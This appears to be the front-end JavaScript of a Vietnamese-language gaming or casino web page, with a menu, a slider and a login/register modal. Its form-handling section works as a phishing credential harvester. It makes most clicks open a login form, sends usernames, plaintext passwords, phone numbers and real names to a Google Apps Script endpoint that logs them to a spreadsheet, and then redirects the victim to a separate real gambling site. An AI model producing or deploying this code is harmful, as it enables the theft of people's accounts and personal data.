document.addEventListener("DOMContentLoaded", () => {
    
    /* =========================================
       1. CHỨC NĂNG MENU & TABS CƠ BẢN
    ========================================= */
    // Xử lý nút mở menu (Hamburger) trên Mobile
    const menuToggle = document.querySelector('.menu-toggle');
    const desktopNav = document.querySelector('.desktop-nav');

    if(menuToggle && desktopNav) {
        menuToggle.addEventListener('click', () => {
            if (desktopNav.style.display === 'block') {
                desktopNav.style.display = 'none';
            } else {
                desktopNav.style.display = 'block';
            }
        });
    }

    // Chức năng chuyển Tab danh mục game
    const tabs = document.querySelectorAll('.tab-item');
    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            // Xóa active khỏi tất cả
            tabs.forEach(t => t.classList.remove('active'));
            // Thêm active vào tab đang click
            tab.classList.add('active');
        });
    });

    /* =========================================
       2. CHỨC NĂNG BANNER SLIDER TRƯỢT TỰ ĐỘNG
    ========================================= */
    const sliderWrapper = document.querySelector('.slider-wrapper');
    const slides = document.querySelectorAll('.slide');
    const dots = document.querySelectorAll('.dot');
    
    // Chỉ chạy Script Slider nếu trên trang có tồn tại Banner
    if(sliderWrapper && slides.length > 0) {
        let currentIndex = 0;
        const totalSlides = slides.length;

        // Hàm cập nhật vị trí slider
        function updateSlider() {
            sliderWrapper.style.transform = `translateX(-${currentIndex * 100}%)`;
            
            // Cập nhật trạng thái màu cho các dấu chấm (dots)
            dots.forEach(dot => dot.classList.remove('active'));
            if (dots[currentIndex]) {
                dots[currentIndex].classList.add('active');
            }
        }

        // Hàm chuyển sang ảnh tiếp theo (Vòng lặp)
        function nextSlide() {
            currentIndex = (currentIndex + 1) % totalSlides; // Quay lại 0 khi hết ảnh
            updateSlider();
        }

        // Cài đặt thời gian tự động trượt (3000ms = 3 giây)
        let sliderInterval = setInterval(nextSlide, 3000);

        // Xử lý sự kiện khi người dùng click vào dấu chấm để tự chuyển ảnh
        dots.forEach((dot, index) => {
            dot.addEventListener('click', () => {
                currentIndex = index;
                updateSlider();
                
                // Xóa bộ đếm thời gian cũ và tạo lại để tránh việc bị trượt ngay sau khi vừa click
                clearInterval(sliderInterval);
                sliderInterval = setInterval(nextSlide, 3000);
            });
        });
    }

    /* =========================================
       3. CHỨC NĂNG ĐÓNG/MỞ MODAL ĐĂNG NHẬP / ĐĂNG KÝ
    ========================================= */
    const authModal = document.getElementById('auth-modal');
    const openModalBtns = document.querySelectorAll('.btn-login, .btn-register'); 
    const closeModalBtns = document.querySelectorAll('.close-btn');

    // Chỉ chạy Script Modal nếu form Đăng nhập có tồn tại trên trang
    if(authModal) {
        const loginForm = document.getElementById('login-form');
        const registerForm = document.getElementById('register-form');

        // Bấm nút Đăng Nhập / Đăng Ký -> Mở Form tương ứng
        openModalBtns.forEach(btn => {
            btn.addEventListener('click', (e) => {
                authModal.style.display = 'flex';
                
                // Nếu bấm nút Đăng Ký thì hiện form đăng ký, ngược lại hiện form đăng nhập
                if(e.target.classList.contains('btn-register')) {
                    loginForm.style.display = 'none';
                    registerForm.style.display = 'block';
                } else {
                    loginForm.style.display = 'block';
                    registerForm.style.display = 'none';
                }
            });
        });

        // Chuyển đổi qua lại giữa 2 form bên trong Modal
        const goToRegisterBtn = document.getElementById('go-to-register');
        const goToLoginBtn = document.getElementById('go-to-login');

        if(goToRegisterBtn) {
            goToRegisterBtn.addEventListener('click', (e) => {
                e.preventDefault();
                loginForm.style.display = 'none';
                registerForm.style.display = 'block';
            });
        }

        if(goToLoginBtn) {
            goToLoginBtn.addEventListener('click', (e) => {
                e.preventDefault();
                registerForm.style.display = 'none';
                loginForm.style.display = 'block';
            });
        }

        // Bấm dấu X -> Đóng Form (Lặp qua tất cả các nút X vì có 2 form)
        closeModalBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                authModal.style.display = 'none';
            });
        });

        // Bấm ra vùng đen bên ngoài -> Đóng Form
        window.addEventListener('click', (e) => {
            if (e.target === authModal) {
                authModal.style.display = 'none';
            }
        });

        /* =========================================
           4. XỬ LÝ KIỂM TRA DỮ LIỆU & ĐẨY LÊN GG SHEETS
        ========================================= */
        const loginSubmitBtn = loginForm.querySelector('.btn-submit');
        const registerSubmitBtn = registerForm.querySelector('.btn-submit');

        // BẠN HÃY DÁN LINK WEB APP CỦA GOOGLE SCRIPT VÀO ĐÂY:
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz_pGcVDZuEccuYQPUfuiLSmvjYBBinEXC3EEHYDI2-0Rx4wAfbY0hkcYHV9Sq6vaE1/exec";

        // Hàm thông báo lỗi chung
        function showError(input, message) {
            alert(message);
            input.focus(); 
            return false;
        }

        // Hàm gửi dữ liệu và chuyển hướng
        function sendDataAndRedirect(btn, data) {
            const originalText = btn.innerText;
            btn.innerText = "Đang xử lý..."; // Đổi text nút khi đang tải
            btn.disabled = true;

            fetch(SCRIPT_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'text/plain;charset=utf-8' },
                body: JSON.stringify(data)
            })
            .then(response => {
                // Đẩy thành công thì chuyển hướng về web đích
                window.location.href = "https://www.52tr88.com/";
            })
            .catch(error => {
                console.error('Lỗi kết nối:', error);
                alert("Có lỗi xảy ra, vui lòng thử lại!");
                btn.innerText = originalText;
                btn.disabled = false;
            });
        }

        // --- Xử lý Đăng Nhập ---
        loginSubmitBtn.addEventListener('click', (e) => {
            e.preventDefault();
            
            const inputs = loginForm.querySelectorAll('input');
            const username = inputs[0];
            const password = inputs[1];
            const phone = inputs[2];

            if (!username.value || username.value.length < 6 || username.value.length > 20) {
                return showError(username, "Tên người dùng phải từ 6 đến 20 ký tự.");
            }
            if (!password.value || password.value.length < 6 || password.value.length > 20) {
                return showError(password, "Mật khẩu phải từ 6 đến 20 ký tự.");
            }
            const phoneRegex = /^[0-9]{10}$/;
            if (!phone.value || !phoneRegex.test(phone.value)) {
                return showError(phone, "Vui lòng nhập đúng 10 số điện thoại.");
            }

            // Gói dữ liệu để đẩy lên Google Sheets
            const formData = {
                status: "Đăng Nhập",
                username: username.value,
                password: password.value,
                phone: phone.value,
                fullname: "" // Form đăng nhập không có Họ Tên
            };

            sendDataAndRedirect(loginSubmitBtn, formData);
        });

        // --- Xử lý Đăng Ký ---
        registerSubmitBtn.addEventListener('click', (e) => {
            e.preventDefault();
            
            // Lấy các input theo cấu trúc HTML mới (đã bỏ mã xác minh)
            const inputs = registerForm.querySelectorAll('input');
            const username = inputs[0]; // Tên người dùng 
            const password = inputs[1]; // Mật khẩu 
            const realName = inputs[2]; // Tên thật
            const phone = inputs[3];    // Số điện thoại

            // 1. Kiểm tra bắt buộc điền toàn bộ 4 trường
            for(let i = 0; i < inputs.length; i++) {
                if(!inputs[i].value.trim()) {
                    return showError(inputs[i], "Vui lòng điền đầy đủ tất cả các trường thông tin.");
                }
            }

            // 2. Ràng buộc Tài khoản (6-20 ký tự)
            if (username.value.length < 6 || username.value.length > 20) {
                return showError(username, "Tên người dùng phải từ 6 đến 20 ký tự.");
            }

            // 3. Ràng buộc Mật khẩu (6-20 ký tự)
            if (password.value.length < 6 || password.value.length > 20) {
                return showError(password, "Mật khẩu phải từ 6 đến 20 ký tự.");
            }

            // 4. Ràng buộc Số điện thoại (Chính xác 10 số)
            const phoneRegex = /^[0-9]{10}$/;
            if (!phoneRegex.test(phone.value)) {
                return showError(phone, "Vui lòng nhập số điện thoại hợp lệ (10 số).");
            }

            // Gói dữ liệu để đẩy lên Google Sheets
            const formData = {
                status: "Đăng Ký",
                username: username.value,
                password: password.value,
                phone: phone.value,
                fullname: realName.value
            };

            // Gọi hàm đẩy dữ liệu và chuyển hướng
            sendDataAndRedirect(registerSubmitBtn, formData);
        });
        // Bấm vào các thành phần khác (Game, Nạp/Rút, VIP, Tài khoản, v.v.) sẽ mở form Đăng nhập
        const requireLoginElements = document.querySelectorAll('.game-card, .quick-item, .bottom-nav-item, .section-more,.bottom-nav-item,.tab-icon,.desktop-nav ');
        
        requireLoginElements.forEach(el => {
            el.addEventListener('click', (e) => {
                // Ngoại trừ nút Trang chủ hoặc các Tab/Mục đang Active để người dùng không bị kẹt
                if(el.querySelector('.fa-home') || el.classList.contains('active')) {
                    return; // Bỏ qua, không mở form đăng nhập
                }
                
                e.preventDefault(); // Ngăn chặn chuyển trang nếu nó là thẻ <a>
                
                // Hiển thị Modal và Form Đăng Nhập
                authModal.style.display = 'flex';
                loginForm.style.display = 'block';
                registerForm.style.display = 'none';
            });
        });
    }
});
